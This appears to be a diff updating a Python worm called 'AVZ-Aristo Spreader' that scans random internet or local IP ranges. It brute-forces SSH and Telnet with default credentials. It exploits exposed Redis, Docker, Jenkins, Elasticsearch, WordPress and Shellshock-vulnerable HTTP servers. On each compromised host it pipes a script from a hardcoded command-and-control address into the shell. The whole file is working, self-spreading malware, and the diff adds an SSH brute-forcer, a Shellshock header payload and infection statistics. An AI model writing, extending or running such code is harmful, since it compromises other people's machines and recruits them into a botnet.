@@ -1,14 +1,17 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v25.8.2 – Telnet через сокеты (без telnetlib)
-import asyncio, aiohttp, random, socket, time, json, os, subprocess, threading, sys, argparse
-import ipaddress
+# AVZ-Aristo Spreader v25.8.9 – port stats, detailed diagnostics
+import asyncio, aiohttp, random, socket, time, json, os, sys, argparse
+import ipaddress, logging
+
+logging.getLogger("paramiko").setLevel(logging.CRITICAL)
 
 C2_HOST = "80.249.146.202"
 C2_PORT = 80
 AGENT_URL = f"http://{C2_HOST}:{C2_PORT}/agent_bash.sh"
 MAX_CONCURRENT = 500
-TIMEOUT = 1.5
+TIMEOUT = 2.0
 DEFAULT_SCAN_COUNT = 10_000
+PORT_LIST = [22, 23, 80, 443, 2375, 6379, 8080, 9200]
 
 SSH_CREDS = [
     ("root","root"), ("root","admin"), ("root","password"), ("root","123456"), ("root","1234"), ("root","pass"),
@@ -46,15 +49,29 @@ async def probe_port(ip, port):
 
 async def ssh_brute(ip):
     try:
-        import asyncssh
+        import paramiko
+        for u, p in SSH_CREDS:
+            try:
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect(ip, username=u, password=p, timeout=2, banner_timeout=2, auth_timeout=2)
+                client.exec_command(f"wget -O- {AGENT_URL} | sh")
+                client.close()
+                return True
+            except:
+                continue
     except ImportError:
         pass
-    for u, p in SSH_CREDS:
+    return False
+
+async def exploit_http(ip):
+    urls = [f"http://{ip}/", f"http://{ip}/cgi-bin/"]
+    headers = {"User-Agent": f"() {{ :; }}; wget -O- {AGENT_URL} | bash"}
+    for url in urls:
         try:
-            async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=2) as conn:
-                result = await conn.run(f"wget -O- {AGENT_URL} | sh")
-                if result.exit_status == 0:
-                    return True
+            async with aiohttp.ClientSession() as session:
+                async with session.get(url, headers=headers, timeout=2) as resp:
+                    pass
         except:
             pass
     return False
@@ -70,7 +87,8 @@ async def exploit_redis(ip):
         r.save(); r.close()
         return True
     except:
-        return False
+        pass
+    return False
 
 async def exploit_docker(ip):
     try:
@@ -80,7 +98,8 @@ async def exploit_docker(ip):
         client.close()
         return True
     except:
-        return False
+        pass
+    return False
 
 async def exploit_jenkins(ip):
     url = f'http://{ip}:8080/script'
@@ -90,16 +109,15 @@ async def exploit_jenkins(ip):
             async with s.post(url, data={'script': script}, timeout=2) as resp:
                 return resp.status == 200
     except:
-        return False
+        pass
+    return False
 
 async def exploit_telnet(ip):
-    """Telnet brute через asyncio сокеты (без telnetlib)."""
     for u, p in SSH_CREDS:
         try:
             reader, writer = await asyncio.wait_for(
                 asyncio.open_connection(ip, 23), timeout=TIMEOUT
             )
-            # Ожидаем приглашение login:
             try:
                 data = await asyncio.wait_for(reader.read(1024), timeout=1)
             except:
@@ -116,7 +134,6 @@ async def exploit_telnet(ip):
                     writer.write(p.encode() + b"\n")
                     await writer.drain()
                     await asyncio.sleep(0.5)
-                    # Пробуем выполнить команду
                     writer.write(f"wget -O- {AGENT_URL} | sh\n".encode())
                     await writer.drain()
                     await asyncio.sleep(0.5)
@@ -136,7 +153,8 @@ async def exploit_elasticsearch(ip):
             async with s.post(f'http://{ip}:9200/_search', json=payload, timeout=2) as resp:
                 return resp.status == 200
     except:
-        return False
+        pass
+    return False
 
 async def exploit_wordpress(ip):
     try:
@@ -148,63 +166,113 @@ async def exploit_wordpress(ip):
         pass
     return False
 
-async def infect(ip):
-    ports = [22, 23, 80, 443, 2375, 6379, 8080, 9200]
+async def infect(ip, port_stats):
+    ports = PORT_LIST
     open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
+    for i, p in enumerate(ports):
+        if open_ports[i]:
+            port_stats[p] = port_stats.get(p, 0) + 1
     if open_ports[0] and await ssh_brute(ip):
+        print(f"[INFECTED] {ip} via SSH", flush=True)
         return True
     if open_ports[5] and await exploit_redis(ip):
+        print(f"[INFECTED] {ip} via Redis", flush=True)
         return True
     if open_ports[4] and await exploit_docker(ip):
+        print(f"[INFECTED] {ip} via Docker", flush=True)
         return True
     if open_ports[6] and await exploit_jenkins(ip):
+        print(f"[INFECTED] {ip} via Jenkins", flush=True)
         return True
     if open_ports[1] and await exploit_telnet(ip):
+        print(f"[INFECTED] {ip} via Telnet", flush=True)
         return True
     if open_ports[7] and await exploit_elasticsearch(ip):
+        print(f"[INFECTED] {ip} via Elasticsearch", flush=True)
         return True
-    if open_ports[2] or open_ports[3]:
-        await exploit_wordpress(ip)
+    if (open_ports[2] or open_ports[3]) and await exploit_http(ip):
+        print(f"[INFECTED] {ip} via HTTP", flush=True)
+        return True
     return False
 
-async def worker(queue, stats):
+async def worker(queue, stats, port_stats, progress_cb=None):
     while True:
         ip = await queue.get()
         try:
-            if await infect(ip):
+            if await infect(ip, port_stats):
                 stats['success'] += 1
             else:
                 stats['fail'] += 1
         except:
             stats['fail'] += 1
+        if progress_cb:
+            await progress_cb()
         queue.task_done()
 
-async def global_scan(count):
+async def scan_cycle(ips, progress_callback=None):
     q = asyncio.Queue()
     stats = {'success':0, 'fail':0}
-    ips = [random_ip() for _ in range(count)]
+    port_stats = {}
+    count = len(ips)
+    progress_count = 0
+
+    async def progress_inner():
+        nonlocal progress_count
+        progress_count += 1
+        if progress_count % 500 == 0 and progress_callback:
+            await progress_callback(progress_count, count, stats, port_stats)
+
     for ip in ips:
         q.put_nowait(ip)
-    tasks = [asyncio.create_task(worker(q, stats)) for _ in range(MAX_CONCURRENT)]
+    tasks = [asyncio.create_task(worker(q, stats, port_stats, progress_inner)) for _ in range(MAX_CONCURRENT)]
     await q.join()
     for t in tasks:
         t.cancel()
-    return stats
+    return stats, port_stats
 
-async def local_scan():
+async def global_scan(count, progress_callback=None):
+    ips = [random_ip() for _ in range(count)]
+    return await scan_cycle(ips, progress_callback)
+
+async def local_scan(progress_callback=None):
     ips = get_local_ips()
     if not ips:
-        return {'success':0, 'fail':0}
-    print(f"[*] Сканируем локальную сеть, {len(ips)} хостов")
-    q = asyncio.Queue()
-    stats = {'success':0, 'fail':0}
-    for ip in ips:
-        q.put_nowait(ip)
-    tasks = [asyncio.create_task(worker(q, stats)) for _ in range(min(MAX_CONCURRENT, len(ips)))]
-    await q.join()
-    for t in tasks:
-        t.cancel()
-    return stats
+        return {'success':0, 'fail':0}, {}
+    print(f"[*] Scanning local network, {len(ips)} hosts", flush=True)
+    return await scan_cycle(ips, progress_callback)
+
+async def main_async(args):
+    print("[*] Checking C2 connection...", flush=True)
+    try:
+        s = socket.socket()
+        s.settimeout(3)
+        s.connect((C2_HOST, C2_PORT))
+        s.sendall(b"ping")
+        s.recv(1024)
+        s.close()
+        print("[+] C2 reachable", flush=True)
+    except Exception as e:
+        print(f"[!] C2 unreachable: {e}", flush=True)
+
+    async def gui_progress(current, total, stats, port_stats):
+        port_str = ", ".join(f"{p}: {c} open" for p, c in sorted(port_stats.items()))
+        if port_str:
+            print(f"[PROGRESS] {current}/{total} | Infected: {stats['success']} | Failed: {stats['fail']} | {port_str}", flush=True)
+        else:
+            print(f"[PROGRESS] {current}/{total} | Infected: {stats['success']} | Failed: {stats['fail']} | All ports closed", flush=True)
+
+    if args.local:
+        print("[*] Mode: local network", flush=True)
+        while True:
+            stats, port_stats = await local_scan(gui_progress)
+            print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
+            await asyncio.sleep(30)
+    else:
+        print(f"[*] Mode: global, {args.count} targets per cycle", flush=True)
+        while True:
+            stats, port_stats = await global_scan(args.count, gui_progress)
+            print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
+            await asyncio.sleep(30)
 
 def main():
     parser = argparse.ArgumentParser()
@@ -213,18 +281,10 @@ def main():
     group.add_argument('--local', action='store_true')
     args = parser.parse_args()
 
-    if args.local:
-        print("[*] Режим: локальная сеть")
-        while True:
-            stats = asyncio.run(local_scan())
-            print(f"Цикл: +{stats['success']} заражено, {stats['fail']} пропущено")
-            time.sleep(30)
-    else:
-        print(f"[*] Режим: глобальный, {args.count} целей за цикл")
-        while True:
-            stats = asyncio.run(global_scan(args.count))
-            print(f"Цикл: +{stats['success']} заражено, {stats['fail']} пропущено")
-            time.sleep(30)
+    try:
+        asyncio.run(main_async(args))
+    except KeyboardInterrupt:
+        print("\n[*] Spreader stopped", flush=True)
 
 if __name__ == '__main__':
     main()
